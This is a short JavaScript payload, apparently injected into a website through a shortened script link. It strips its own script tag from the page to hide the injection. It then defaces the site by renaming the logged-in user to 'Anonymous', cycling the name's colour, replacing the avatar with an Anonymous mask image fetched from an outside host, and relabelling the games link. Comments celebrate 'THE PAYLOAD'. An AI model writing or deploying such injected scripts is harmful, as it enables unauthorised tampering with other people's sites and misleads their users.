//var script = document.querySelector("script[src='//goo.gl/PHPvuT']")

var script = document.currentScript;

var oldHtml = document.body.innerHTML;

var newHtml = oldHtml.slice(0, oldHtml.indexOf("<script src=\"//goo.gl/PHPvuT\">"));//the first argument of slice is the start position (index 0), but the second is how MANY characters

document.body.innerHTML = newHtml + oldHtml.slice( newHtml.length + "<script src=\"//goo.gl/PHPvuT\">".length )

//FIXES THE WHOLE DAMN SITE! WORKS LIKE A CHARM! Now HERES THE FUN PART!!! THE PAYLOAD!!!

var userName = document.querySelector(".welcome-user-name")

userName.innerText = "Anonymous"

var i = 0;

setInterval(function(){
  userName.style.color = ("hsl(" + i%361 + ", 75%, 50%)")
  i++;
}, 12);

var avatar = document.querySelector(".profile-avatar-picture")

if (avatar) {
  avatar.firstChild.style.width = "100%"
  avatar.firstChild.style.height = "100%"
  avatar.firstChild.src = "http://webiconspng.com/wp-content/uploads/2017/09/Anonymous-Mask-PNG-Image-87272.png"
};

var play = document.querySelector("a[href='/games']");

if (play) {
  play.innerText = "Fun Games!"
};
